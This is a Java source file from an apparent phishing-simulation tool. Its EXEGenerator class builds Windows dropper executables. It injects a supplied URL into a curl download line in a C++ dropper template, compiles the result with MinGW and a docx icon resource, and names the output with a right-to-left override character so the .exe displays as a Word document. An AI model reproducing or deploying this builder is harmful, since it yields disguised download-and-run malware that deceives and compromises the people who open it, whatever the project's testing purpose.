package com.galimimus.phishingmonitor.helpers;

import com.galimimus.phishingmonitor.StartApplication;

import javax.activation.FileDataSource;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Calendar;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.galimimus.phishingmonitor.helpers.Validation.createToken;

public class EXEGenerator {
    static final Logger log = Logger.getLogger(StartApplication.class.getName());

    public void EXE_gen(String filename, String url) {
        System.out.println("EXE_GEN started");
        StringBuilder text = new StringBuilder();
        Pattern pattern = Pattern.compile("URL_DOWNLOAD = \"curl ");
        Scanner scanner = null;
        SettingsSingleton ss = SettingsSingleton.getInstance();
        try {
            scanner = new Scanner(new File(ss.getWORKING_DIRECTORY()+"/dropper_files/dropper-original.cpp"));
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        String tmp = "";
        Matcher matcher = pattern.matcher("");
        while (scanner.hasNextLine()) {
            tmp = scanner.nextLine();
            System.out.println(tmp);
            matcher.reset(tmp);
            while (matcher.find()) {
                StringBuilder sb = new StringBuilder(tmp);
                sb.insert(matcher.end(), url);
                tmp = String.valueOf(sb);
            }
            text.append(tmp).append("\n");
        }
        scanner.close();
        Path DropperGeneratedPath = Paths.get("dropper_files/dropper_outs/dropper" + filename/*.split("\u202e")[0] */+ ".cpp");
        try {
            byte[] bt = String.valueOf(text).getBytes();
            Files.write(DropperGeneratedPath, bt, StandardOpenOption.CREATE);
        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }
        try {//x86_64-w64-mingw32-g++ dropper.cpp resource.o -o dropi.exe -mwindows -static-libstdc++ -static-libgcc

            String command = ss.getMINGW_COMMAND()+" " +
                    DropperGeneratedPath.toAbsolutePath().normalize() + " " + Paths.get("dropper_files/resource_docx.o").toAbsolutePath().normalize() + " -o "
                    + Paths.get("files").toAbsolutePath().normalize() + "/" + filename +"\u202excod.exe" + " -mwindows -static-libstdc++ -static-libgcc";//TODO:удаление промежуточного файла cpp
            readData(Runtime.getRuntime().exec(command));

        } catch (IOException e) {
            log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
            throw new RuntimeException(e);
        }

    }

    private void readData(Process run) {
        String line;

        BufferedReader inputReader = new BufferedReader(new InputStreamReader(run.getInputStream()));
        BufferedReader outputReader = new BufferedReader(new InputStreamReader(run.getErrorStream()));
        try {
            while ((line = inputReader.readLine()) != null) {
                System.out.println(line);
            }
            inputReader.close();
            while ((line = outputReader.readLine()) != null) {
                System.out.println(line);
            }
            outputReader.close();

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}